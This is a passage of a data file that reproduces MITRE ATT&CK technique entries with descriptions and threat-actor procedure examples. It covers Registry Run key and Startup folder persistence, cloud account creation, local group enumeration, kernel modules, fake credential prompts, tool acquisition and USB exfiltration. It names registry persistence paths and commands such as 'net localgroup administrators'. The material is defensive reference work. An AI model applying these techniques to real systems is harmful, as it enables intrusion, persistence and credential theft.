<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia</code>.', '[USBStealer] registers itself under a Registry Run key with the name ""USB Disk Security.""', '[Winnti for Windows] can add a service named <code>wind0ws</code> to the Registry to achieve persistence after reboot.', '[JHUHUGIT] has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.', '[MoleNet] can achieve persitence on the infected machine by setting the Registry run key. ', '[Sidewinder] has added paths to executables in the Registry to establish persistence.', '[BitPaymer] has set the run key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.', '[FatDuke] has used <code>HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run</code> to establish persistence.', '[LiteDuke] can create persistence by adding a shortcut in the <code>CurrentVersion\\Run</code> Registry key.', 'The ""SCOUT"" variant of [NETEAGLE] achieves persistence by adding itself to the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.', '[ServHelper] may attempt to establish persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> run key.', '[ShimRat] has installed a registry based start-up key <code>HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run</code> to maintain persistence should other methods fail.', '[Threat Group-3390] malware can add a Registry key to `Software\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence.', '[Remexi] utilizes Run Registry keys in the HKLM hive as a persistence mechanism.', ""[SPACESHIP] achieves persistence by creating a shortcut in the current user's Startup folder."", '[Tropic Trooper] has created shortcuts in the Startup folder to establish persistence.', '[Lazarus Group] has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.', '[APT41] created and modified startup files for persistence. [APT41] added a registry key in <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost</code> to establish persistence for Cobalt Strike.', '[Windshift] has created LNK files in the Startup folder to establish persistence.', '[Mispadu] creates a link in the startup folder for persistence. [Mispadu] adds persistence via the registry key `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.', '[Empire] can modify the registry run keys <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.', '[Chinoxy] has established persistence via the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key and by loading a dropper to `(%COMMON_ STARTUP%\\\\eoffice.exe)`.', '[Small Sieve] has the ability to add itself to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift` for persistence.', '[SMOKEDHAM] has used <code>reg.exe</code> to create a Registry Run key.', '[SDBbot] has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. ', '[FIN7] malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.', '[Dark Caracal] version of [Bandook] adds a registry key to <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.', '[Gold Dragon] establishes persistence in the Startup folder.', '[TINYTYPHON] installs itself under Registry Run key to establish persistence.', '[FIN10] has established persistence by using the Registry option in PowerShell Empire to add a Run key.', '[Aria-body] has established persistence via the Startup folder or Run Registry key.', '[PROMETHIUM] has used Registry run keys to establish persistence.', '[PowerShower] sets up persistence with a Registry run key.', '[Turian] can establish persistence by adding Registry Run keys.', '[Briba] creates run key Registry entries pointing to malicious DLLs dropped to disk.', '[PowerSploit] <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.', '[Bisonal] has added itself to the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\</code> for persistence. ', '[RunningRAT] adds itself to the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence upon reboot.', '[TAINTEDSCRIBE] can copy itself into the current user’s Startup folder as “Narrator.exe” for persistence.', '[Machete] used the startup folder for persistence.', '[CrossRAT] uses run keys for persistence on Windows.', '[BACKSPACE] achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.', '[DownPaper] uses PowerShell to add a Registry Run key in order to establish persistence.', '[Kasidet] creates a Registry Run key to establish persistence.', '[Flagpro] has dropped an executable file to the startup directory. ', '[Octopus] achieved persistence by placing a malicious executable in the startup directory and has added the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key to the Registry.', '[njRAT] has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code> and dropped a shortcut in <code>%STARTUP%</code>.', '[LuminousMoth] has used malicious DLLs that setup persistence in the Registry Key `HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run`.', '[DnsSystem] can write itself to the Startup folder to gain persistence.', '[Zebrocy] creates an entry in a Registry Run key for the malware to execute on startup.', 'To establish persistence, [SslMM] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.', '[BADNEWS] installs a registry Run key to establish persistence.', '[Conficker] adds Registry Run keys to establish persistence.', '[ANDROMEDA] can establish persistence by dropping a sample of itself to `C:\\ProgramData\\Local Settings\\Temp\\mskmde.com` and adding a Registry run key to execute every time a user logs on.', '[LookBack] sets up a Registry Run key to establish a persistence mechanism.', '[Ramsay] has created Registry Run keys to establish persistence.', '[Koadic] has added persistence to the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` Registry key.', '[FIN13] has used Windows Registry run keys such as, `HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts` to maintain persistence.', '[DustySky] achieves persistence by creating a Registry entry in <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.', '[Carbanak] stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.', '[VBShower] used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\\[a-f0-9A-F]{8}</code> to maintain persistence.', '[Rocke] miner has created UPX-packed files in the Windows Start Menu Folder.\t', '[PlugX] adds Run key entries in the Registry to establish persistence.', '[Chaes] has added persistence via the Registry key <code>software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help</code>.', '[Saint Bot] has established persistence by being copied to the Startup directory or through the `\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key.', '[Molerats] saved malicious files within the AppData and Startup folders to maintain persistence.', '[RCSession] has the ability to modify a Registry Run key to establish persistence.', '[gh0st RAT] has added a Registry Run key to establish persistence.', '[BabyShark] has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.', '[TinyZBot] can create a shortcut in the Windows startup folder for persistence.', '[DarkComet] adds several Registry entries to enable automatic execution at every system startup.', '[POWERSOURCE] achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.', '[Seasalt] creates a Registry entry to ensure infection after reboot under <code>HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run</code>.', '[Heyoka Backdoor] can establish persistence with the auto start function including using the value `EverNoteTrayUService`.', '[NavRAT] creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.', 'During [Operation Sharpshooter] a first-stage downloader installed [Rising Sun] to `%Startup%\\mssync.exe` on a compromised host. ', '[PLAINTEE] gains persistence by adding the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.', 'Some [InnaputRAT] variants establish persistence by modifying the Registry key <code>HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe</code>.', '[SeaDuke] is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.', '[Cobalt Group] has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.', '[GRIFFON] has used a persistence module that stores the implant inside the Registry, which executes at logon.', '[Mustang Panda] has created the registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU</code> to maintain persistence.', '[Higaisa] added a spoofed binary to the start-up folder for persistence.', '[Sykipot] has been known to establish persistence by adding programs to the Run Registry key.', '[Kimsuky] has placed scripts in the startup folder for persistence and modified the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce` Registry key.', '[Prikormka] adds itself to a Registry Run key with the name guidVGA or guidVSA.', '[Dragonfly] has added the registry value ntdll to the Registry Run key to establish persistence.', '[SNUGRIDE] establishes persistence through a Registry Run key.', '[SysUpdate] can use a Registry Run key to establish persistence.', '[Okrum] establishes persistence by creating a .lnk shortcut to itself in the Startup folder. ', '[IcedID] has established persistence by creating a Registry run key.', '[LazyScripter] has achieved persistence via writing a PowerShell script to the autorun registry key.', '[NanHaiShu] modifies the %regrun% Registry to point itself to an autostart mechanism.', '[BoomBox] can establish persistence by writing the Registry value <code>MicroNativeCacheSvc</code> to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>.', '[APT3] places scripts in the startup folder for persistence.', '[EvilGrab] adds a Registry Run key for ctfmon.exe to establish persistence.', 'The [BlackEnergy] 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.', '[Amadey] has changed the Startup folder to the one containing its executable by overwriting the registry keys.', '[Avaddon] uses registry run keys for persistence.', '[Darkhotel] has been known to establish persistence by adding programs to the Run Registry key.', '[GuLoader] can establish persistence via the Registry under <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.', '[S-Type] may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}</code>.', '[APT33] has deployed a tool known as [DarkComet] to the Startup folder of a victim, and used Registry run keys to gain persistence.', '[BRONZE BUTLER] has used a batch script that adds a Registry Run key to establish malware persistence.', '[Pupy] adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code> for persistence.', '[Comnie] achieves persistence by adding a shortcut of itself to the startup path in the Registry.', '[StrongPity] can use the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key for persistence.', '[Zeus Panda] adds persistence by creating Registry Run keys.', 'Several [Ke3chang] backdoors achieved persistence by adding a Run key.', '[CORESHELL] has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.', '[NanoCore] creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.', '[SILENTTRINITY] can establish a LNK file in the startup folder for persistence.', '[Confucius] has dropped malicious files into the startup folder `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` on a compromised host in order to maintain persistence.', '[Cardinal RAT] establishes Persistence by setting the  <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> Registry key to point to its executable.', '[Ryuk] has used the Windows command line to create a Registry entry under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence.', '[AppleSeed] has the ability to create the Registry key name <code>EstsoftAutoUpdate</code> at <code>HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce</code> to establish persistence.', '[POWERTON] can install a Registry Run key for persistence.', '[APT18] establishes persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key.', '[Mosquito] establishes persistence under the Registry key <code>HKCU\\Software\\Run auto_update</code>.', '[Astaroth] creates a startup item for persistence. ', '[PoetRAT] has added a registry key in the <RUN> hive for persistence.', '[TrickBot] establishes persistence in the Startup folder.', '[FELIXROOT] adds a shortcut file to the startup folder for persistence.', '[RedLeaves] attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.', '[PowerDuke] achieves persistence by using various Registry Run keys.', '[KOCTOPUS] can set the AutoRun Registry key with a PowerShell command.', '[Gamaredon Group] tools have registered Run keys in the registry to give malicious VBS files persistence.', '[TURNEDUP] is capable of writing to a Registry Run key to establish.', '[Bazar] can create or add files to Registry Run Keys to establish persistence.', '[Mongall] can establish persistence with the auto start function including using the value `EverNoteTrayUService`. ', '[Wizard Spider] has established persistence via the Registry key <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> and a shortcut within the startup folder.', '[APT32] established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.', '[MCMD] can use Registry Run Keys for persistence.', 'If establishing persistence by installation as a new service fails, one variant of [Elise] establishes persistence for the created .exe file by setting the following Registry key: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe</code>. Other variants have set the following Registry keys for persistence: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self]</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD</code>.', '[Taidoor] has modified the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> key for persistence.', '[RogueRobin] created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.', 'During [Operation Honeybee] the threat actors used batch files that allowed them to establish persistence by adding the following Registry key: `""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost"" /v COMSysApp /t REG_MULTI_SZ /d ""COMSysApp"" /f`.', '[Honeybee] uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.', '[Sharpshooter] first-stage downloader installed [Rising Sun] to the startup folder <code>%Startup%\\mssync.exe</code>.\t', '[Dragonfly 2.0] added the registry value ntdll to the Registry Run key to establish persistence.', '[Machete] used the startup folder for persistence.']",False
T1136.003,Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.  In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access] While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.  Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.  Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials] or assigning [Additional Cloud Roles]","['[APT29] can create new users through Azure AD.', ""[LAPSUS$] has created global admin accounts in the targeted organization's cloud instances to gain persistence."", '[AADInternals] can create new Azure AD users.']",False
T1069.001,Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.  Commands such as <code>net localgroup</code> of the [Net] utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.","['[Turla] has used <code>net localgroup</code> and <code>net localgroup Administrators</code> to enumerate group information, including members of the local administrators group.', '[JPIN] can obtain the permissions of the victim user.', '[Sys10] collects the group name of the logged-in user and sends it to the C2.', '[BloodHound] can collect information about local groups and members.', '[SILENTTRINITY] can obtain a list of local groups and members.', '[Tonto Team] has used the <code>ShowLocalGroupDetails</code> command to identify administrator, user, and guest accounts on a compromised host.', '[POWRUNER] may collect local group information by running <code>net localgroup administrators</code> or a series of other commands on a victim.', 'During [C0015] the threat actors used the command `net localgroup ""adminstrator"" ` to identify accounts with local administrator rights.', '[HEXANE] has run `net localgroup` to enumerate local groups.', 'During [Operation Wocao] threat actors used the command `net localgroup administrators` to list all administrators part of a local group.', '[QakBot] can use <code>net localgroup</code> to enable discovery of local groups.', '[Cobalt Strike] can use <code>net localgroup</code> to list local groups on a system.', 'Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [Net] to gather information about and manipulate groups.', '[PoshC2] contains modules, such as <code>Get-LocAdm</code> for enumerating permission groups.', '[Kazuar] gathers information about local groups and members.', '[admin@338] actors used the following command following exploitation of a machine with [LOWBALL] malware to list local groups: <code>net localgroup administrator >> %temp%\\download</code>', '[Emissary] has the capability to execute the command <code>net localgroup administrators</code>.', '[Flagpro] has been used to execute the <code>net localgroup administrators</code> command on a targeted system.', 'During [Operation CuckooBees] the threat actors used the `net group` command as part of their advanced reconnaissance.', '[Chimera] has used <code>net localgroup administrators</code> to identify  accounts with local administrative rights.', '[Caterpillar WebShell] can obtain a list of local groups of users from a system.', '[Helminth] has checked the local administrators group.', '[Epic] gathers information on local group names.', '[OSInfo] has enumerated the local administrators group.', ' [Volt Typhoon] has run `net localgroup administrators` in compromised environments to enumerate accounts. ', '[OilRig] has used <code>net localgroup administrators</code> to find local administrators on compromised systems.', '[FlawedAmmyy] enumerates the privilege level of the victim during the initial infection.', '[Kwampirs] collects a list of users belonging to the local users and administrators groups with the commands <code>net localgroup administrators</code> and <code>net localgroup users</code>.', '[Operation Wocao] has used the command <code>net localgroup administrators</code> to list all administrators part of a local group.']",False
T1547.006,Kernel Modules and Extensions,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.   When used maliciously, LKMs can be a type of kernel-mode [Rootkit] that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.  Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.  Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as ""Legacy System Extensions"" since there is no System Extension for Kernel Programming Interfaces.  Adversaries can use LKMs and kexts to conduct [Persistence] and/or [Privilege Escalation] on a system. Examples have been found in the wild, and there are some relevant open source projects as well.","['[Drovorub] can use kernel modules to establish persistence.', '[Skidmap] has the ability to install several loadable kernel modules (LKMs) on infected machines.', 'During [Operation CuckooBees] attackers used a signed kernel rootkit to establish additional persistence.']",False
T1056.002,GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control]  Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as [AppleScript] and [PowerShell] On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell]  Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery] and/or [Application Window Discovery] to spoof prompts when users are naturally accessing sensitive sites/data.","['[Proton] prompts users for their credentials.', '[iKitten] prompts the user for their credentials.', '[Metamorfo] has displayed fake forms on top of banking sites to intercept credentials from victims. ', ""[Calisto] presents an input prompt asking for the user's login and password."", '[Keydnap] prompts the users for credentials.', '[Bundlore] prompts the user for their credentials.', '[FIN4] has presented victims with spoofed Windows Authentication prompts to collect their credentials.', '[Dok] prompts the user for credentials.', '[Mispadu] can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.', '[XCSSET] prompts the user to input credentials using a native macOS dialog box leveraging the system process <code>/Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment</code>.', '[SILENTTRINITY] `credphisher.py` module can prompt a current user for their credentials.']",False
T1588.002,Tool,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec] Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike] Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.  Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).","['[DarkVishnya] has obtained and used tools such as [Impacket] [Winexe] and [PsExec]', '[Turla] has obtained and customized publicly-available tools like [Mimikatz]', 'During the [C0032] campaign, [TEMP.Veles] obtained and used tools such as Mimikatz and PsExec.', '[Inception] has obtained and used open-source tools such as [LaZagne]', '[Magic Hound] has obtained and used tools like [Havij] [sqlmap] Metasploit, [Mimikatz] and Plink.', 'For [Operation Spalax] the threat actors obtained packers such as CyaX.', '[BITTER] has obtained tools such as PuTTY for use in their operations.', '[Kimsuky] has obtained and used tools such as Nirsoft WebBrowserPassVIew, [Mimikatz] and [PsExec]', '[BlackTech] has obtained and used tools such as Putty, SNScan, and [PsExec] for its operations.', 'MuddyWater has made use of legitimate tools ConnectWise and Remote Utilities to gain access to target environment.', '[LAPSUS$] has obtained tools such as RVTools and AD Explorer for their operations.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] used tools such as Mimikatz and other open-source software.', '[Leafminer] has obtained and used tools such as [LaZagne] [Mimikatz] [PsExec] and [MailSniper]', '[APT29] has obtained and used a variety of tools including [Mimikatz] [SDelete] [Tor] [meek] and [Cobalt Strike]', '[APT28] has obtained and used open-source tools like [Koadic] [Mimikatz] and [Responder]', '[Wizard Spider] has utilized tools such as [Empire] [Cobalt Strike] [Cobalt Strike] [Rubeus] [AdFind] [BloodHound] Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.', '[Ember Bear] has obtained and used open source scripts from GitHub. ', '[BRONZE BUTLER] has obtained and used open-source tools such as [Mimikatz] [gsecdump] and [Windows Credential Editor]', '[menuPass] has used and modified open-source tools like [Impacket] [Mimikatz] and [pwdump]', '[APT41] has obtained and used tools such as [Mimikatz] [pwdump] [PowerSploit] and [Windows Credential Editor]', '[FIN8] has used open-source tools such as [Impacket] for targeting efforts.', '[TA505] has used a variety of tools in their operations, including [AdFind] [BloodHound] [Mimikatz] and [PowerSploit]', '[APT39] has modified and used customized versions of publicly-available tools like PLINK and [Mimikatz]', '[GALLIUM] has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.', '[Cleaver] has obtained and used open-source tools such as [PsExec] [Windows Credential Editor] and [Mimikatz]', '[BackdoorDiplomacy] has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.', '[Cinnamon Tempest] has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage.', ' [TA2541] has used commodity remote access tools. ', '[FIN6] has obtained and used tools such as [Mimikatz] [Cobalt Strike] and [AdFind]', '[Sandworm Team] has acquired open-source tools for their operations, including [Invoke-PSImage] which was used to establish an encrypted channel from a compromised host to [Sandworm Team] C2 server in preparation for the 2018 Winter Olympics attack, as well as [Impacket] and RemoteExec, which were used in their 2022 [Prestige] operations.', '[Patchwork] has obtained and used open-source tools such as [QuasarRAT]', '[FIN7] has utilized a variety of tools such as [Cobalt Strike] [PowerSploit] and the remote management tool, Atera for targeting efforts.', 'For [Operation CuckooBees] the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.   ', '[LuminousMoth] has obtained an ARP spoofing tool from GitHub.', 'During [Night Dragon] threat actors obtained and used tools such as [gsecdump]', '[APT-C-36] obtained and used a modified variant of [Imminent Monitor]', '[WIRTE] has obtained and used [Empire] for post-exploitation activities.', '[FIN13] has utilized publicly available tools such as [Mimikatz] [Impacket] PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts.', '[Cobalt Group] has obtained and used a variety of tools including [Mimikatz] [PsExec] [Cobalt Strike] and [SDelete]', 'For [C0021] the threat actors used [Cobalt Strike] configured with a modified variation of the publicly available Pandora Malleable C2 Profile.', '[Ke3chang] has obtained and used tools such as [Mimikatz]', '[Threat Group-3390] has obtained and used tools such as [Impacket] [pwdump] [Mimikatz] [gsecdump] [NBTscan] and [Windows Credential Editor]', '[Lazarus Group] has obtained a variety of tools for their operations, including [Responder] and PuTTy PSCP.', '[FIN5] has obtained and used a customized version of [PsExec] as well as use other tools such as [pwdump] [SDelete] and [Windows Credential Editor]', '[Thrip] has obtained and used tools such as [Mimikatz] and [PsExec]', '[Moses Staff] has used the commercial tool DiskCryptor.', 'For [Operation Wocao] the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and [BloodHound]', 'During [CostaRicto] the threat actors obtained open source tools to use in their operations. ', '[POLONIUM] has obtained and used tools such as AirVPN and plink in their operations. ', '[PittyTiger] has obtained and used tools such as [Mimikatz] and [gsecdump]', '[HEXANE] has acquired, and sometimes customized, open source tools such as [Mimikatz] [Empire] VNC remote access software, and DIG.net.', '[Whitefly] has obtained and used tools such as [Mimikatz]', '[FIN10] has relied on publicly-available software to gain footholds and establish persistence in victim environments.', '[Dragonfly] has obtained and used tools such as [Mimikatz] [CrackMapExec] and [PsExec]', '[IndigoZebra] has acquired open source tools such as [NBTscan] and Meterpreter for their operations. ', '[Aquatic Panda] has acquired and used [Cobalt Strike] in its operations.', '[Aoqin Dragon] obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.', '[APT38] has obtained and used open-source tools such as [Mimikatz]', '[Earth Lusca] has acquired and used a variety of open source tools.', '[APT33] has obtained and leveraged publicly-available tools for early intrusion activities.', 'For [Operation Dream Job] [Lazarus Group] obtained tools such as Wake-On-Lan, [Responder] ChromePass, and dbxcli.', '[Ferocious Kitten] has obtained open source tools for its operations, including JsonCPP and Psiphon.', '[APT32] has obtained and used tools such as [Mimikatz] and [Cobalt Strike] and a variety of other open-source tools from GitHub.', 'For [C0018] the threat actors acquired a variety of open source tools, including [Mimikatz] [Sliver] SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.', '[Gorgon Group] has obtained and used tools such as [QuasarRAT] and [Remcos]', '[Silence] has obtained and modified versions of publicly-available tools like [Empire] and [PsExec] ', '[Chimera] has obtained and used tools such as [BloodHound] [Cobalt Strike] [Mimikatz] and [PsExec]', ""[Metador] has used Microsoft's Console Debugger in some of their operations."", '[CopyKittens] has used Metasploit, [Empire] and AirVPN for post-exploitation activities.', '[Silent Librarian] has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.', 'During [C0027] [Scattered Spider] obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.', 'For [C0010] UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.', '[Volt Typhoon] has used customized versions of open-source tools for C2.', 'For [Frankenstein] the threat actors obtained and used [Empire]', '[APT19] has obtained and used publicly-available tools like [Empire]', 'For [C0015] the threat actors obtained a variety of tools, including [AdFind]  AnyDesk, and Process Hacker.', 'For [C0017] [APT41] obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.', 'For [FunnyDream] the threat actors used a modified version of the open source [PcShare] remote administration tool.', '[Blue Mockingbird] has obtained and used tools such as [Mimikatz]', 'During [Cutting Edge] threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory.', '[APT1] has used various open-source tools for privilege escalation purposes.', '[Carbanak] has obtained and used open-source tools such as [PsExec] and [Mimikatz]', '[DarkHydrus] has obtained and used tools such as [Mimikatz] [Empire] and [Cobalt Strike]', '[TEMP.Veles] has obtained and used tools such as [Mimikatz] and [PsExec]', '[CostaRicto] has obtained open source tools to use in their operations.', '[Frankenstein] has obtained and used [Empire] to deploy agents.', '[Night Dragon] has obtained and used tools such as [gsecdump]']",
T1052.001,Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","['[SPACESHIP] copies staged data to removable drives when they are inserted into the system.', '[Remsec] contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.', '[USBStealer] exfiltrates collected files via removable media from air-gapped victims.', '[Tropic Trooper] has exfiltrated data using USB storage devices.\t', '[Mustang Panda] has used a customized [PlugX] variant which could exfiltrate documents from air-gapped networks.', '[Agent.btz] creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.', '[Machete] has a feature to copy files from every drive onto a removable drive in a hidden folder.']",
